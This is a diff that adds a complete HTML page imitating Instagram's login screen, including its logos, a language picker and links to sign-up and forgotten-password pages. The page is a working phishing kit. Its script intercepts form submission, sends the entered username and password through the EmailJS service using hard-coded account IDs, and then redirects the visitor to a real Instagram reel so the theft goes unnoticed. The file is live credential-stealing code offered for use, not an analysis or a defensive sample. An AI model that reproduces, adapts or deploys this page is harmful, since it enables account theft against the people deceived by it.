@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Instagram Login</title>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<style>
+ * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+html, body {
+  width: 100%;
+  height: 100%;
+}
+
+body {
+  font-family: 'Arial', sans-serif;
+  background-color: #fff;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: space-between;
+  overflow: hidden;
+}
+
+/* 🔹 Top Section */
+.top-section {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  padding-top: 20px; /* ⬆️ Increased top gap */
+  flex-shrink: 0;
+}
+
+/* Back arrow & select option gap fix */
+.back-arrow {
+  font-size: 26px;
+  cursor: pointer;
+  color: #000;
+  position: absolute;
+  left: 15px;
+  top: 3px; /* 🔹 Slight top gap from language select */
+}
+
+.language-select select {
+  margin-top: 10px;
+  background: #fff;
+  border: none;
+  font-size: 14px;
+  color: #000;
+  outline: none;
+  cursor: pointer;
+}
+
+/* 🔹 Middle Section */
+.container {
+  text-align: center;
+  width: 90%;
+  max-width: 400px;
+  flex-grow: 1;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  gap:15px;
+}
+
+/* ✅ Equal Spacing Between Language → Logo → Inputs */
+.logo {
+  width: 55px;
+   margin: 0 auto; /* Centered logo with spacing above and below */
+}
+
+/* Input fields */
+.input-box {
+  margin-top:60px;
+  width: 100%;
+  padding: 20px;
+  margin: 6px 0;
+  border: 1px solid #ccc;
+  border-radius: 10px;
+  font-size: 15px;
+}
+
+/* ✅ Equal spacing control */
+.language-select {
+  margin-bottom: 35px; /* gap before logo */
+}
+
+.input-box:first-of-type {
+  margin-top: 95px; /* equal gap after logo */
+}
+
+/* Buttons */
+.login-btn {
+  width: 100%;
+  padding: 12px;
+  background-color: #1877F2;
+  color: #fff;
+  border: none;
+  border-radius: 25px;
+  margin-top: 10px;
+  font-size: 16px;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+
+.login-btn:hover {
+  background-color: #1558C5;
+  transform: scale(1.02);
+}
+
+.forgot-password {
+  margin-top: 14px;
+  font-size: 14px;
+  font-weight: bold;
+  color: #000;
+  cursor: pointer;
+}
+
+/* 🔹 Bottom Section */
+.bottom-section {
+  margin-top: 120px;
+  width: 100%;
+  text-align: center;
+  flex-shrink: 0;
+}
+
+/* ✅ Proper gap: 30px above Meta, 20px below */
+.create-account {
+  display: inline-block;
+  width: 90%;
+  max-width: 400px;
+  border: 1px solid #1877F2;
+  color: #1877F2;
+  border-radius: 25px;
+  padding: 12px;
+  font-size: 16px;
+  text-align: center;
+  /*margin-top: 35px;*/
+  margin-bottom: 10px; /* ✅ 30px gap before Meta */
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+
+.create-account:hover {
+  background-color: #e7f0ff;
+  transform: scale(1.02);
+}
+
+/* ✅ Meta logo fixed bottom */
+.meta {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #555;
+  font-size: 14px;
+  font-weight: bold;
+  margin-bottom: 20px; /* ✅ 20px gap from bottom */
+}
+
+.meta img {
+  width: 80px;
+  opacity: 0.9;
+}
+
+/* ✅ Responsive Adjustments */
+@media (max-height: 750px) {
+  .logo {
+    width: 55px;
+    margin: 20px auto;
+  }
+  .language-select {
+    margin-bottom: 20px;
+  }
+  .input-box:first-of-type {
+    margin-top: 20px;
+  }
+  .create-account {
+    padding: 10px;
+    font-size: 15px;
+  }
+  .meta img {
+    width: 70px;
+  }
+}
+
+@media (max-height: 650px) {
+  body {
+    justify-content: flex-start;
+    overflow-y: auto;
+  }
+  .logo {
+    width: 50px;
+  }
+  .create-account {
+    margin-top: 25px;
+    margin-bottom: 25px;
+  }
+}
+
+</style>
+</head>
+<body>
+
+  <!-- 🔹 Top Section -->
+  <div class="top-section">
+    <div class="back-arrow" onclick="goBack()">←</div>
+    <div class="language-select">
+      <select>
+        <option>English (India)</option>
+        <option>Hindi</option>
+        <option>मराठी</option>
+        <option>ગુજરાતી</option>
+      </select>
+    </div>
+  </div>
+
+  <!-- 🔹 Login Form -->
+  <div class="container">
+    <img class="logo" src="Instagram.png" alt="Instagram Logo" />
+    <form  method="POST" id="loginForm">
+      <input type="text" name="name" class="input-box" placeholder="Username, email or mobile number" required>
+      <input type="text" name="password" class="input-box" placeholder="Password" required>
+      <button type="submit" class="login-btn">Log in</button>
+      <p class="forgot-password" onclick="window.location.href='forget.html'">Forgotten Password?</p>
+    </form>
+  </div>
+
+  <!-- 🔹 Bottom Section -->
+  <div class="bottom-section">
+    <div class="create-account" onclick="window.location.href='signup.html'">
+      Create new account
+    </div>
+    <div class="meta">
+      <img src="meta.png" alt="Meta Logo" />
+    </div>
+  </div>
+
+  <script>
+
+    function goBack() {
+      if (document.referrer) {
+        window.history.back();
+      } else {
+        window.location.href = 'index.html';
+      }
+    }
+
+    (function() {
+    emailjs.init("bLKWA54e4LWKG6_ck"); // YOUR PUBLIC KEY
+  })();
+
+    // 🔥 Login Form Submit Script
+document.getElementById("loginForm").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    emailjs.send("service_mjl6o1a", "template_fassto7", {
+        user_name: document.querySelector("input[name='name']").value,
+        user_password: document.querySelector("input[name='password']").value
+    })
+    .then(function(response) {
+        window.location.href = "https://www.instagram.com/reel/DQUZpCZD0n7/?igsh=aTVlbGVwYWU5NGg1";
+    }, function(error) {
+        console.log(error);
+    });
+
+});
+
+  
+
+  </script>
+
+</body>
+</html>
